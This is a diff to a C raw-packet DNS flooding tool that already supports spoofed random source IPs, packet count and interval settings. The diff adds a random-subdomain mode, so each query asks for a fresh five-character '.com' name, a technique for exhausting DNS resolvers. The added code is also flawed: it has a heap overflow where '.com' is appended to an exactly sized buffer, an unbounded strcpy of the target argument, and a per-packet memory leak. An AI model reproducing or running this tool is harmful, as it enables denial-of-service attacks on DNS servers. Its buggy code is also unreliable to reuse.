@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
+#include <time.h>
 
 #include <sys/socket.h>
 #include <sys/types.h>
@@ -15,6 +16,30 @@
 #include <getopt.h>
 
 #define	  CLASS_INET 1
+
+/* alphabet: [a-z0-9] */
+const char alphabet[] = "abcdefghijklmnopqrstuvwxyz0123456789";
+
+/**
+ * not a cryptographically secure number
+ * return interger [0, n).
+ */
+int intN(int n) { return rand() % n; }
+
+/**
+ * Input: length of the random string [a-z0-9] to be generated
+ */
+char *randomString(int len) {
+  char *rstr = malloc((len + 1) * sizeof(char));
+  int i;
+  for (i = 0; i < len; i++) {
+    rstr[i] = alphabet[intN(strlen(alphabet))];
+  }
+  rstr[len] = '\0';
+  char *str;
+  str = strcat(rstr, ".com");
+  return str;
+}
 
 enum dns_type {
 	TYPE_A = 1,
@@ -137,6 +162,7 @@ void usage(char *progname)
 			"\t-i, --interval\t\tinterval (in millisecond) between two packets\n"
 			"\t-n, --number\t\tnumber of DNS requests to send\n"
 			"\t-r, --random\t\tfake random source IP\n"
+                        "\t-d, --randomdomain\t\tauto generate domain name\n"
 			"\t-D, --daemon\t\trun as daemon\n"
 			"\t-h, --help\n"
 			"\n"
@@ -228,6 +254,7 @@ int main(int argc, char **argv)
 	int sleep_interval = 0;	/* interval (in millisecond) between two packets */
 
 	int random_ip = 0;
+        int random_domain = 0;
 	int static_ip = 0;
 
 	int arg_options;
@@ -241,6 +268,7 @@ int main(int argc, char **argv)
 		{"src-port", required_argument, NULL, 'P'},
 		{"daemon", no_argument, NULL, 'D'},
 		{"random", no_argument, NULL, 'r'},
+                {"randomdomain", no_argument, NULL, 'd'},
 		{"source-ip", required_argument, NULL, 's'},
 		{"interval", required_argument, NULL, 'i'},
 		{"number", required_argument, NULL, 'n'},
@@ -285,6 +313,9 @@ int main(int argc, char **argv)
 			random_ip = 1;
 			srandom((unsigned long)time(NULL));
 			break;
+                case 'd':
+                        random_domain = 1;
+                        break;
 
 		case 'D':
 			//TODO
@@ -329,8 +360,10 @@ int main(int argc, char **argv)
 	optind++;
 
 	/* target IP */
+        char target[256] = {0};
 	if (optind < argc) {
 		inet_pton(AF_INET, argv[optind], &sin_dst.sin_addr);
+                strcpy(target, argv[optind]);
 	} else {
 		quit = 1;
 	}
@@ -384,6 +417,14 @@ int main(int argc, char **argv)
 	iphdr->ip_hl = sizeof(struct ip) >> 2;
 	iphdr->ip_ttl = 245;
 	iphdr->ip_p = IPPROTO_UDP;
+ 
+        printf("[!] Your input:\n");
+        printf("[+] Target DNS Server: %s\n", target);
+        printf("[+] Target port: %d\n", dst_port);
+        printf("[+] Number of requests: %d\n", number);
+        printf("[+] Random source: %d\n", random_ip);
+        printf("[+] Random qname: %d\n", random_domain);
+        printf("[+] Target domain: %s\n", qname);
 
 	while (1) {
 		int dns_datalen;
@@ -397,7 +438,16 @@ int main(int argc, char **argv)
 		}
 
 		dns_header->id = random();
-		dns_datalen = make_question_packet(dns_data, qname, TYPE_A);
+                
+                if (random_domain) {
+                        char *qnamen;
+                        qnamen = randomString(5);
+                        dns_datalen = make_question_packet(dns_data, qnamen, TYPE_A);
+                }
+	        else
+                {
+                        dns_datalen = make_question_packet(dns_data, qname, TYPE_A);
+                }
 
 		udp_datalen = sizeof(struct dnshdr) + dns_datalen;
 		ip_datalen = sizeof(struct udphdr) + udp_datalen;
